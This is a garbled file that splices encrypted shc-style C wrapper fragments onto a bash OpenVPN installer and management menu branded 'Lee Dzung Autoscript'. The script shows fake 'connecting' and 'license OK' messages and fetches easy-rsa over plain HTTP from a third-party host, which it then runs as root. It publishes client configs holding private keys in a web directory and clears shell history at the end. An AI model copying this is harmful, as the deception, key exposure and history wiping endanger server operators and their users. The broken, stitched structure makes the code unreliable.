	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}
# Function sleeping  
function lee-sleep () {
sleep 0.5
echo -e "\e[0;31mConnecting to server.......\e[0;0m"
sleep 0.3
    echo -e "\e[0;32mConnected\e[0;0m"
       echo ""
sleep 0.5 
    echo -e "\e[0;31mCheck script license.......\e[0;0m"
 sleep 0.3    
       echo -e "\e[0;32mOK!\e[0;0m"
       echo ""
sleep 0.1
}
echo
lee-sleep

# Function back
function return () {    
           echo ""
           echo -e "\e[0;36m Do you want continue create client & user?\e[0m"
           echo -e "\e[0;35m 1) Yes\e[0m"
           echo -e "\e[0;35m 2) No\e[0m"
	       read -p " Select [1-2] than press ENTER: " option1
	       case $option1 in
        1)
		clear
        bash systems
		exit
		;;
       	2)
		clear
		5000
		exit
		;;
	esac
}
function removed-user () {    
           echo ""
           echo -e "\e[0;36m Do you want continue delete another user & clients?\e[0m"
           echo -e "\e[0;35m 1) Yes\e[0m"
           echo -e "\e[0;35m 2) No\e[0m"
	       read -p " Select [1-2] than press ENTER: " option1
	       case $option1 in
        1)
		clear
        bash systems
		exit
		;;
       	2)
		clear
		5000
		exit
		;;
	esac
}
function openvpn-download() {
lee-sleep
        echo -e "\e[0;36m---------------------------------------\e[0;0m" 
        echo "Download your Openvpn client config  "
        echo -e "\e[0;36m---------------------------------------\e[0;0m" 
        echo ""
		echo -e "\e[0;33m  http://$IP/client & user.ovpn\e[0;0m"
        echo -e "\e[0;33m  http://XXX.XXX.XX.XX/client & user.ovpn\e[0;0m"
       echo -e "\e[0;34m"
    	read -p "Press enter to " -e -i back option1
	case $option1 in
        back)
		clear
        bash systems
		exit
		;;
	esac
}
   
function openvpn-port() {
lee-sleep
        echo ""
        
		echo "What Openvpn port would you like to change?"
            read -p "Port: " -e -i 1194 PORT
            sed -i "s/port [0-9]*/port $PORT/" /etc/openvpn/server.conf
            service openvpn restart
            echo ""
            echo -e "\e[0;36m----------------------------\e[0;0m" 
            echo "New Openvpn Allow Port: $PORT"
            echo -e "\e[0;36m----------------------------\e[0;0m" 
            echo -e "\e[0;31mRemember!!! Have to change new openvpn port in your client config \e[0;0m"
            echo ""
       echo -e "\e[0;34m"
    	read -p "Press enter to " -e -i back option1
	case $option1 in
        back)
		clear
        bash systems
		exit
		;;
	esac
}
   
function openvpn-user() {
lee-sleep
        echo -e "\e[0;36m-----------------------------------\e[0;0m"
echo "Checking OpenVPN login";
echo -e "\e[0;36m-----------------------------------\e[0;0m"
tail -f /etc/openvpn/openvpn-status.log
        echo ""
       echo -e "\e[0;34m"
    	read -p "Press enter to " -e -i back option1
	case $option1 in
        back)
		clear
        bash systems
		exit
		;;
	esac
}
   
function openvpn-bug() {
lee-sleep
        echo ""
		echo -e "\e[0;36m Haven't bug on server \e[0;0m"
        echo ""
       echo -e "\e[0;34m"
    	read -p "Press enter to " -e -i back option1
	case $option1 in
        back)
		clear
        bash systems
		exit
		;;
	esac
}
   
function openvpn-restart() {
lee-sleep
        echo -e "\e[0;31mOpenvpn service going to restart NOW.......  \e[0;0m"
        service openvpn restart
        echo ""
       echo -e "\e[0;34m"
    	read -p "Press enter to " -e -i back option1
	case $option1 in
        back)
		clear
        bash systems
		exit
		;;
	esac
}

IP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
if readlink /proc/$$/exe | grep -q "dash"; then
	echo "This script needs to be run with bash, not sh"
	exit
fi

if [[ "$EUID" -ne 0 ]]; then
	echo "Sorry, you need to run this as root"
	exit
fi

if [[ ! -e /dev/net/tun ]]; then
	echo "The TUN device is not available
You need to enable TUN before running this script"
	exit
fi

if [[ -e /etc/debian_version ]]; then
	OS=debian
	GROUPNAME=nogroup
	RCLOCAL='/etc/rc.local'
elif [[ -e /etc/centos-release || -e /etc/redhat-release ]]; then
	OS=centos
	GROUPNAME=nobody
	RCLOCAL='/etc/rc.d/rc.local'
else
	echo "Looks like you aren't running this installer on Debian, Ubuntu or CentOS"
	exit
fi

newclient () {
	# Generates the custom client.ovpn
	cp /etc/openvpn/client-common.txt ~/$1.ovpn
	echo "<ca>" >> ~/$1.ovpn
	cat /etc/openvpn/easy-rsa/pki/ca.crt >> ~/$1.ovpn
	echo "</ca>" >> ~/$1.ovpn
	echo "<cert>" >> ~/$1.ovpn
	sed -ne '/BEGIN CERTIFICATE/,$ p' /etc/openvpn/easy-rsa/pki/issued/$1.crt >> ~/$1.ovpn
	echo "</cert>" >> ~/$1.ovpn
	echo "<key>" >> ~/$1.ovpn
	cat /etc/openvpn/easy-rsa/pki/private/$1.key >> ~/$1.ovpn
	echo "</key>" >> ~/$1.ovpn
	echo "<tls-auth>" >> ~/$1.ovpn
	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/ta.key >> ~/$1.ovpn
	echo "</tls-auth>" >> ~/$1.ovpn
}

if [[ -e /etc/openvpn/server.conf ]]; then
	while :
	do
    echo -e "\e[0;35m                         OPENVPN SERVICES OPTION\e[0m"
    echo -e "\e[0;34m                         -------ooooOAOoooo------\e[0m"
    echo -e "\e[0;35m 1)\e[0m Add a new user & client                  (create new user & client)"
    echo -e "\e[0;35m 2)\e[0m User List & Delete                       (user details & remove)"
	echo -e "\e[0;35m 3)\e[0m Download client                          (download client config)"
    echo -e "\e[0;35m 4)\e[0m Download bug                             (download bug openvpn)"
    echo -e "\e[0;35m 5)\e[0m Restart openvpn                          (openvpn service restart)"
	echo -e "\e[0;35m 6)\e[0m Change openvpn port                      (change openvpn port)"
    echo -e "\e[0;35m 7)\e[0m Openvpn user login                       (openvpn user login)"
    echo -e "\e[0;35m 8)\e[0m Back to home                             (back to menu)"
    echo -e "\e[0;35m 9)\e[0m Exit                                     (logout)"
    echo ""
		read -p "Select an option [1-9]: " option
		case $option in
			1) 
            echo
            lee-sleep
			echo
    echo -e "\e[0;33mThis Version Openvpn must create every client for every customer\e[0;0m"
	echo -e "\e[0;33mEvery client expired on 30 days. No need username and password\e[0;0m"
	echo -e "\e[0;31mPlease, no special characters.\e[0;0m"
    echo
			read -p "Client & Username: " -e CLIENT
            echo
			cd /etc/openvpn/easy-rsa/
			EASYRSA_CERT_EXPIRE=30 ./easyrsa build-client-full $CLIENT nopass
			# Generates the custom client.ovpn
			newclient "$CLIENT"
            cd /root
            mv $CLIENT.ovpn /home/vps/public_html
            echo
			echo -e "\e[0;34m$CLIENT\e[0m added in systems, download client at: http://$IP/$CLIENT.ovpn"
            echo
            return
			exit
			;;
			2) echo
            lee-sleep
			echo
			# This option could be documented a bit better and maybe even be simplified
			# ...but what can I say, I want some sleep too
			NUMBEROFCLIENTS=$(tail -n +2 /etc/openvpn/easy-rsa/pki/index.txt | grep -c "^V")
			if [[ "$NUMBEROFCLIENTS" = '0' ]]; then
				echo
				echo -e "\e[0;35mYou have no existing clients!\e[0;0m"
                echo
               removed-user
				exit
			fi
			echo
			echo "Select the client & username you want to deleted:"
            echo
            echo -e "\e[0;36m------------------------------------------------\e[0;0m"
            echo
			tail -n +2 /etc/openvpn/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') '
			if [[ "$NUMBEROFCLIENTS" = '1' ]]; then
            echo
            echo -e "\e[0;36m------------------------------------------------\e[0;0m"
				read -p "Select one number [1]: " CLIENTNUMBER
			else
            echo
            echo -e "\e[0;36m------------------------------------------------\e[0;0m"
				read -p "Select one number [1-$NUMBEROFCLIENTS]: " CLIENTNUMBER
			fi
			CLIENT=$(tail -n +2 /etc/openvpn/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$CLIENTNUMBER"p)
			echo
			read -p "Do you really want to delete access for client & username $CLIENT? [y/N]: " -e REVOKE
			if [[ "$REVOKE" = 'y' || "$REVOKE" = 'Y' ]]; then
				cd /etc/openvpn/easy-rsa/
				./easyrsa --batch revoke $CLIENT
				EASYRSA_CRL_DAYS=30 ./easyrsa gen-crl
				rm -f /etc/openvpn/crl.pem
				cp /etc/openvpn/easy-rsa/pki/crl.pem /etc/openvpn/crl.pem
                cd /home/vps/public_html
                rm $CLIENT.ovpn
                cd /root
                clear
				# CRL is read with each client connection, when OpenVPN is dropped to nobody
				chown nobody:$GROUPNAME /etc/openvpn/crl.pem
                clear
				echo
				echo -e "\e[0;34m$CLIENT\e[0m removed from systems!"
                echo
                removed-user
			else
				echo
				echo -e "\e[0;34m$CLIENT\e[0m aborted!"
                echo 
                removed-user
			fi
            removed-user
			exit
			;;
			88) 
			echo
			read -p "Do you really want to remove OpenVPN? [y/N]: " -e REMOVE
			if [[ "$REMOVE" = 'y' || "$REMOVE" = 'Y' ]]; then
				PORT=$(grep '^port ' /etc/openvpn/server.conf | cut -d " " -f 2)
				PROTOCOL=$(grep '^proto ' /etc/openvpn/server.conf | cut -d " " -f 2)
				if pgrep firewalld; then
					IP=$(firewall-cmd --direct --get-rules ipv4 nat POSTROUTING | grep '\-s 10.8.0.0/24 '"'"'!'"'"' -d 10.8.0.0/24 -j SNAT --to ' | cut -d " " -f 10)
					# Using both permanent and not permanent rules to avoid a firewalld reload.
					firewall-cmd --zone=public --remove-port=$PORT/$PROTOCOL
					firewall-cmd --zone=trusted --remove-source=10.8.0.0/24
					firewall-cmd --permanent --zone=public --remove-port=$PORT/$PROTOCOL
					firewall-cmd --permanent --zone=trusted --remove-source=10.8.0.0/24
					firewall-cmd --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
					firewall-cmd --permanent --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
				else
					IP=$(grep 'iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to ' $RCLOCAL | cut -d " " -f 14)
					iptables -t nat -D POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
					sed -i '/iptables -t nat -A POSTROUTING -s 10.8.0.0\/24 ! -d 10.8.0.0\/24 -j SNAT --to /d' $RCLOCAL
					if iptables -L -n | grep -qE '^ACCEPT'; then
						iptables -D INPUT -p $PROTOCOL --dport $PORT -j ACCEPT
						iptables -D FORWARD -s 10.8.0.0/24 -j ACCEPT
						iptables -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
						sed -i "/iptables -I INPUT -p $PROTOCOL --dport $PORT -j ACCEPT/d" $RCLOCAL
						sed -i "/iptables -I FORWARD -s 10.8.0.0\/24 -j ACCEPT/d" $RCLOCAL
						sed -i "/iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT/d" $RCLOCAL
					fi
				fi
				if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$PORT" != '1194' ]]; then
					semanage port -d -t openvpn_port_t -p $PROTOCOL $PORT
				fi
				if [[ "$OS" = 'debian' ]]; then
					apt-get remove --purge -y openvpn
				else
					yum remove openvpn -y
				fi
				rm -rf /etc/openvpn
				rm -f /etc/sysctl.d/30-openvpn-forward.conf
				echo
				echo "OpenVPN removed!"
			else
				echo
				echo "Removal aborted!"
			fi
			exit
			;;
			3)
		clear
        openvpn-download
		exit
		;;
		4)
		clear
        openvpn-bug
		exit
		;;
        5)
		clear
        openvpn-restart
		exit
		;;
		6)
		clear
        openvpn-port
		exit
		;;
        7)
		clear
        openvpn-user
		exit
		;;
        8)
		clear
        5000
		exit
		;;
        9)
		clear
        exit
		exit
		;;  
		esac
	done
else
	clear
    lee-sleep
	echo "Welcome to Lee Dzung Autoscript"
	echo
	# OpenVPN setup and first user creation
	echo "I need to ask you a few questions before starting the setup."
	echo "You can leave the default options and just press enter if you are ok with them."
	echo
	# Autodetect IP address and pre-fill for the user
	IP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
	read -p "Are you Sure your IP address: " -e -i $IP IP
	# If $IP is a private IP address, the server must be behind NAT
	if echo "$IP" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)'; then
		echo
		read -p "IP address / hostname? " -e PUBLICIP
	fi
	echo
	echo "Which protocol do you want for OpenVPN connections?"
	echo "   1) TCP (recommended)"
	echo "   2) UDP"
	read -p "Protocol [1-2]: " -e -i 1 PROTOCOL
	case $PROTOCOL in
		2) 
		PROTOCOL=udp
		;;
		1) 
		PROTOCOL=tcp
		;;
	esac
	echo
	echo "What port do you want OpenVPN listening to?"
	read -p "Port: " -e -i 1194 PORT
	echo
	echo "Which DNS do you want to use with the VPN?"
	echo "   1) Current system"
	echo "   2) Google"
	echo "   3) OpenDNS"
	read -p "DNS [1-3]: " -e -i 1 DNS
	echo
    echo -e "\e[0;33mThis Version Openvpn must create every client for every customer\e[0;0m"
	echo -e "\e[0;33mEvery client expired on 30 days. No need username and password\e[0;0m"
	echo -e "\e[0;31mPlease, no special characters.\e[0;0m"
    echo
	read -p "Client & Username: " -e -i client CLIENT
	echo
	read -n1 -r -p "Press any key to continue..."
	if [[ "$OS" = 'debian' ]]; then
		apt-get update
		apt-get install openvpn iptables openssl ca-certificates -y
	else
		# Else, the distro is CentOS
		yum install epel-release -y
		yum install openvpn iptables openssl ca-certificates -y
	fi
	# Get easy-rsa
	EASYRSAURL='http://leedzung-autoscript.net/autoscript/Other/EasyRSA-unix-v3.0.6.tgz'
	wget -O ~/easyrsa.tgz "$EASYRSAURL" 2>/dev/null || curl -Lo ~/easyrsa.tgz "$EASYRSAURL"
	tar xzf ~/easyrsa.tgz -C ~/
	mv ~/EasyRSA-v3.0.6/ /etc/openvpn/
	mv /etc/openvpn/EasyRSA-v3.0.6/ /etc/openvpn/easy-rsa/
	chown -R root:root /etc/openvpn/easy-rsa/
	rm -f ~/easyrsa.tgz
	cd /etc/openvpn/easy-rsa/
	# Create the PKI, set up the CA and the server and client certificates
	./easyrsa init-pki
	./easyrsa --batch build-ca nopass
	EASYRSA_CERT_EXPIRE=30 ./easyrsa build-server-full server nopass
	EASYRSA_CERT_EXPIRE=30 ./easyrsa build-client-full $CLIENT nopass
	EASYRSA_CRL_DAYS=30 ./easyrsa gen-crl
	# Move the stuff we need
	cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem /etc/openvpn
	# CRL is read with each client connection, when OpenVPN is dropped to nobody
	chown nobody:$GROUPNAME /etc/openvpn/crl.pem
	# Generate key for tls-auth
	openvpn --genkey --secret /etc/openvpn/ta.key
	# Create the DH parameters file using the predefined ffdhe2048 group
	echo '-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz
+8yTnc4kmz75fS/jY2MMddj2gbICrsRhetPfHtXV/WVhJDP1H18GbtCFY2VVPe0a
87VXE15/V8k1mE8McODmi3fipona8+/och3xWKE2rec1MKzKT0g6eXq8CrGCsyT7
YdEIqUuyyOP7uWrat2DX9GgdT0Kj3jlN9K5W7edjcrsZCwenyO4KbXCeAvzhzffi
7MA0BM0oNC9hkXL+nOmFg/+OTxIy7vKBg8P+OxtMb61zO7X8vC7CIAXFjvGDfRaD
ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==
-----END DH PARAMETERS-----' > /etc/openvpn/dh.pem
	# Generate server.conf
	echo "port $PORT
proto $PROTOCOL
dev tun
sndbuf 0
rcvbuf 0
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA512
tls-auth ta.key 0
topology subnet
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist ipp.txt" > /etc/openvpn/server.conf
	echo 'push "redirect-gateway def1 bypass-dhcp"' >> /etc/openvpn/server.conf
	# DNS
	case $DNS in
		1)
		# Locate the proper resolv.conf
		# Needed for systems running systemd-resolved
		if grep -q "127.0.0.53" "/etc/resolv.conf"; then
			RESOLVCONF='/run/systemd/resolve/resolv.conf'
		else
			RESOLVCONF='/etc/resolv.conf'
		fi
		# Obtain the resolvers from resolv.conf and use them for OpenVPN
		grep -v '#' $RESOLVCONF | grep 'nameserver' | grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | while read line; do
			echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server.conf
		done
		;;
		4)
		echo 'push "dhcp-option DNS 1.1.1.1"' >> /etc/openvpn/server.conf
		echo 'push "dhcp-option DNS 1.0.0.1"' >> /etc/openvpn/server.conf
		;;
		2)
		echo 'push "dhcp-option DNS 8.8.8.8"' >> /etc/openvpn/server.conf
		echo 'push "dhcp-option DNS 8.8.4.4"' >> /etc/openvpn/server.conf
		;;
		3)
		echo 'push "dhcp-option DNS 208.67.222.222"' >> /etc/openvpn/server.conf
		echo 'push "dhcp-option DNS 208.67.220.220"' >> /etc/openvpn/server.conf
		;;
		5)
		echo 'push "dhcp-option DNS 64.6.64.6"' >> /etc/openvpn/server.conf
		echo 'push "dhcp-option DNS 64.6.65.6"' >> /etc/openvpn/server.conf
		;;
	esac
	echo "keepalive 10 120
cipher AES-256-CBC
user nobody
group $GROUPNAME
persist-key
persist-tun
status openvpn-status.log
verb 3
crl-verify crl.pem" >> /etc/openvpn/server.conf
	# Enable net.ipv4.ip_forward for the system
	echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
	# Enable without waiting for a reboot or service restart
	echo 1 > /proc/sys/net/ipv4/ip_forward
	if pgrep firewalld; then
		# Using both permanent and not permanent rules to avoid a firewalld
		# reload.
		# We don't use --add-service=openvpn because that would only work with
		# the default port and protocol.
		firewall-cmd --zone=public --add-port=$PORT/$PROTOCOL
		firewall-cmd --zone=trusted --add-source=10.8.0.0/24
		firewall-cmd --permanent --zone=public --add-port=$PORT/$PROTOCOL
		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/24
		# Set NAT for the VPN subnet
		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
	else
		# Needed to use rc.local with some systemd distros
		if [[ "$OS" = 'debian' && ! -e $RCLOCAL ]]; then
			echo '#!/bin/sh -e
exit 0' > $RCLOCAL
		fi
		chmod +x $RCLOCAL
		# Set NAT for the VPN subnet
		iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP
		sed -i "1 a\iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $IP" $RCLOCAL
		if iptables -L -n | grep -qE '^(REJECT|DROP)'; then
			# If iptables has at least one REJECT rule, we asume this is needed.
			# Not the best approach but I can't think of other and this shouldn't
			# cause problems.
			iptables -I INPUT -p $PROTOCOL --dport $PORT -j ACCEPT
			iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
			iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
			sed -i "1 a\iptables -I INPUT -p $PROTOCOL --dport $PORT -j ACCEPT" $RCLOCAL
			sed -i "1 a\iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT" $RCLOCAL
			sed -i "1 a\iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" $RCLOCAL
		fi
	fi
	# If SELinux is enabled and a custom port was selected, we need this
	if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$PORT" != '1194' ]]; then
		# Install semanage if not already present
		if ! hash semanage 2>/dev/null; then
			yum install policycoreutils-python -y
		fi
		semanage port -a -t openvpn_port_t -p $PROTOCOL $PORT
	fi
	# And finally, restart OpenVPN
	if [[ "$OS" = 'debian' ]]; then
		# Little hack to check for systemd
		if pgrep systemd-journal; then
			systemctl restart openvpn@server.service
		else
			/etc/init.d/openvpn restart
		fi
	else
		if pgrep systemd-journal; then
			systemctl restart openvpn@server.service
			systemctl enable openvpn@server.service
		else
			service openvpn restart
			chkconfig openvpn on
		fi
	fi
	# If the server is behind a NAT, use the correct IP address
	if [[ "$PUBLICIP" != "" ]]; then
		IP=$PUBLICIP
	fi
	# client-common.txt is created so we have a template to add further users later
	echo "client
dev tun
proto $PROTOCOL
sndbuf 0
rcvbuf 0
remote $IP $PORT
http-proxy $IP 8080
http-proxy-retry
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
auth SHA512
cipher AES-256-CBC
setenv opt block-outside-dns
key-direction 1
verb 3" > /etc/openvpn/client-common.txt
	# Generates the custom client.ovpn
	newclient "$CLIENT"
    cd /root
    mv $CLIENT.ovpn /home/vps/public_html
	echo
	echo "Finished!"
fi
cat /dev/null > ~/.bash_history && history -c
end () {
#if 0
#endif
static  char data [] = 
#define      tst2_z	19
#define      tst2	((&data[0]))
	"\352\226\364\105\344\004\205\005\216\125\264\243\226\325\233\374"
	"\227\114\261\132\102\017\263"
#define      rlax_z	1
#define      rlax	((&data[23]))
	"\026"
#define      xecc_z	15
#define      xecc	((&data[25]))
	"\234\073\144\065\222\263\322\033\072\111\100\374\033\372\071\113"
#define      lsto_z	1
#define      lsto	((&data[40]))
	"\206"
#define      chk2_z	19
#define      chk2	((&data[41]))
	"\173\175\122\053\000\327\210\246\127\377\244\147\140\254\115\263"
	"\251\073\022\275"
#define      pswd_z	256
#define      pswd	((&data[113]))
	"\057\126\262\001\303\301\145\256\314\071\011\017\110\274\301\011"
	"\010\042\160\030\277\330\317\140\266\001\260\164\001\176\250\061"
	"\324\132\062\227\033\230\106\350\321\117\367\032\013\271\043\024"
	"\334\224\054\233\373\177\333\307\052\377\157\034\051\106\076\206"
	"\333\260\254\053\235\252\110\225\125\172\033\373\065\120\221\201"
	"\225\211\150\220\011\104\130\063\104\307\120\155\016\217\363\351"
	"\077\237\024\335\112\135\162\237\327\215\233\014\336\055\215\164"
	"\266\366\005\300\072\135\364\177\044\104\354\062\323\340\033\022"
	"\233"
#define      tst1_z	22
#define      tst1	((&data[385]))
	"\371\335\237\160\067\142\220\364\126\124\103\105\110\241\254\163"
	"\062\207\134\104\134\131\266\270\342\313\054\227\345"
#define      shll_z	10
#define      shll	((&data[411]))
	"\063\125\361\317\254\365\345\010\172\367"
#define      inlo_z	3
#define      inlo	((&data[421]))
	"\015\256\055"
#define      chk1_z	22
#define      chk1	((&data[428]))
	"\163\304\057\160\220\045\125\103\206\250\204\255\226\017\021\041"
	"\027\105\060\227\024\144\270\065\015\342"
#define      msg2_z	19
#define      msg2	((&data[453]))
	"\233\010\235\267\171\203\272\137\131\126\255\230\173\163\237\050"
	"\057\215\312\172\132\164\232\243"
#define      msg1_z	42
#define      msg1	((&data[476]))
	"\371\016\374\240\075\372\050\247\253\333\247\166\046\316\026\037"
	"\043\301\205\166\013\340\137\225\225\116\244\105\227\303\340\173"
	"\162\026\361\037\236\311\247\303\135\147\243\172\372\304\072"
#define      opts_z	1
#define      opts	((&data[521]))
	"\362"
#define      date_z	1
#define      date	((&data[522]))
	"\317"
#define      text_z	11549
#define      text	((&data[1444]))
	"\034\331\320\335\042\364\117\073\245\276\350\166\257\231\051\364"
	"\371\331\142\365\240\162\056\236\340\317\333\357\270\113\350\325"
	"\045\270\262\107\254\002\202\122\300\152\310\160\004\361\145\375"
	"\313\310\362\153\072\041\012\032\361\346\012\251\061\362\176\126"
	"\262\205\030\251\370\324\243\324\031\172\016\047\050\316\004\373"
	"\147\052\003\013\111\172\272\114\117"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
/* rtc.c */
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#if !TRACEABLE
#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
}